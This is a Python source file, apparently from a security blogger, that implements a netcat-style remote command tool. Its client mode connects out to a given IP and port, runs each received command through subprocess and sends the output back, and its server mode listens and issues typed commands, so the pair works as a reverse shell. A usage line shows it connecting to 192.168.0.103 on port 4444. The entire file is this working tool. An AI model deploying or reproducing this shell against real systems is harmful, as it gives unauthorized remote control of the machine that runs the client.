#-*- coding:utf-8 -*-
# @Time    : 2020-05-14 14:45
# @Author  : nice0e3
# @FileName: python_nc
# @Software: PyCharm
# @Blog    ：https://www.cnblogs.com/nice0e3/
import socket
import sys
import subprocess
import getopt
def client(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        while True:
            rcve_data = s.recv(1024)
            command = rcve_data.decode()
            command =command.strip()
            if command == 'exit':
                break
            else:
                output = subprocess.check_output(command)
                s.sendall(output)

    except Exception as e :
        print(e)

def server(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('',port))
    s.listen(5)
    rcve_data, rcve_ip_port = s.accept()
    while True:
        # rcve_data, rcve_ip_port = s.accept()
        # print(rcve_data, rcve_ip_port)

        if rcve_data:
            command = input('$>')
            if command == 'exit':
                break
            else:
                rcve_data.sendall(command.encode())
                data = rcve_data.recv(1024)
                print(data.decode(encoding='GBK'))

def usage():
    print('this is the tool usage')
    print("server :python nc.py -l")
    print("client :python nc.py -i 192.168.0.103 -p 4444")

def main():
    if (len(sys.argv)<3):
        print('参数错误')
        usage()
    else:
        # ip = sys.argv[1]
        # prot = int(sys.argv[2])
        # client(ip,prot)
        # #
        if len(sys.argv) >=3:

            opts, args = getopt.getopt(sys.argv[1:], 'l:i:p:')
            for k, v in opts:
                if (k == '-l'):
                    prot =int(v)
                    server(prot)

                elif(k=='-i'):
                    ip = v
                elif(k=='-p'):
                    prot1 = int(v)
                    client(ip, prot1)





if __name__ == '__main__':
    main()
